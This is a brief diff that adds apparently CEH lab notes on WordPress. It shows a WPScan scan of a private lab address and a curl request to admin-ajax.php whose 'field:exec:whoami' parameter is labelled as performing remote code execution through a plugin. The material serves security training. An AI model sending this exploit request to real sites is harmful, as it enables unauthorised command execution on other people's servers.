@@ -1,0 +1,9 @@
+WPScan * Linux 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token] 
+
+$ curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' 
+[To Perfrom RCE]
+
